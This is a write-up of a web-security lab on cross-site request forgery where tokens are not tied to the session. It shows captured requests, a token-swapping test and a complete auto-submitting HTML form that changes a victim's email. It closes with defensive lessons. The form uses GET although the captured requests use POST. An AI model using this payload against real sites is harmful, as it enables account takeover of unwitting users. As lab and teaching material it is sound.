# CSRF Where Token Is Not Tied to User Session

This lab demonstrates a Cross-Site Request Forgery (CSRF) vulnerability where the application uses a CSRF token, but the token is not properly tied to the user's session.

The goal is to exploit this behavior to change the victim's email address.

## Vulnerability

The application provides an email-change functionality at:

```text
/my-account/change-email
```

A normal email change request contains both the new email address and a CSRF token:

```http
POST /my-account/change-email HTTP/2
Content-Type: application/x-www-form-urlencoded

email=example@gmail.com&csrf=<CSRF_TOKEN>
```

The application checks whether the supplied token is valid, but the token is not bound to the session that generated it.

This means a valid CSRF token obtained from one account can be used while making a request from another account.

## Steps to Reproduce

### 1. Log in as the first user

Log in to the lab using the provided credentials and navigate to:

```text
/my-account
```

The account page contains the functionality to change the user's email address.

### 2. Capture the email-change request

Change the email address and intercept the request using Burp Suite.

The request contains:

```http
POST /my-account/change-email HTTP/2
Content-Type: application/x-www-form-urlencoded

email=<EMAIL>&csrf=<CSRF_TOKEN>
```

The important parameter is the `csrf` token.

### 3. Obtain a CSRF token from another account

Log in as another user, such as `carlos`, and capture their email-change request.

The request contains a different CSRF token:

```http
POST /my-account/change-email HTTP/2

email=<EMAIL>&csrf=<CARLOS_CSRF_TOKEN>
```

### 4. Test whether the token is tied to the session

Return to the first user's authenticated session and modify the email-change request.

Replace the original CSRF token with the token obtained from `carlos`.

For example:

```http
POST /my-account/change-email HTTP/2
Content-Type: application/x-www-form-urlencoded

email=attacker@gmail.com&csrf=<CARLOS_CSRF_TOKEN>
```

Send the request.

The request is accepted and the email is changed even though the CSRF token was generated for a different user's session.

This confirms that the CSRF token is not tied to the user's session.

## Creating the CSRF Exploit

Because the endpoint accepts the request, an attacker can create an HTML page that automatically submits the email-change request.

The exploit can contain:

```html
<html>
<body>

<form action="https://LAB-ID.web-security-academy.net/my-account/change-email" method="GET">
    <input type="hidden" name="email" value="attacker@gmail.com">
    <input type="hidden" name="csrf" value="<VALID_CSRF_TOKEN>">
</form>

<script>
    document.forms[0].submit();
</script>

</body>
</html>
```

The valid CSRF token can be obtained from another account because the application does not associate the token with the session that is making the request.

## Delivering the Exploit

1. Open the exploit server.
2. Place the CSRF HTML payload in the response body.
3. Store the exploit.
4. Use **Deliver exploit to victim**.
5. The victim's browser automatically submits the request while authenticated to the vulnerable application.

The vulnerable application accepts the request because the supplied CSRF token is valid, even though it was generated for a different session.

## Result

The victim's email address is changed to the attacker-controlled email address.

The screenshots demonstrate:

- Capturing the normal email-change request.
- Obtaining a CSRF token from another account.
- Reusing that token in a different authenticated session.
- Successfully changing the email address.
- Creating and delivering the CSRF exploit through the exploit server.

## Key Learning

- A CSRF token must be associated with the user's session.
- Simply checking whether a token is valid is not sufficient.
- A token generated for one user must not be accepted in another user's session.
- CSRF protection should validate both the token and its association with the authenticated session.
- An attacker can exploit session-independent CSRF tokens to perform state-changing actions on behalf of another user.

## Conclusion

The application is vulnerable to CSRF because its CSRF tokens are not properly bound to user sessions. A token obtained from one account can be reused from another authenticated session, allowing an attacker to perform unauthorized actions such as changing the victim's email address.
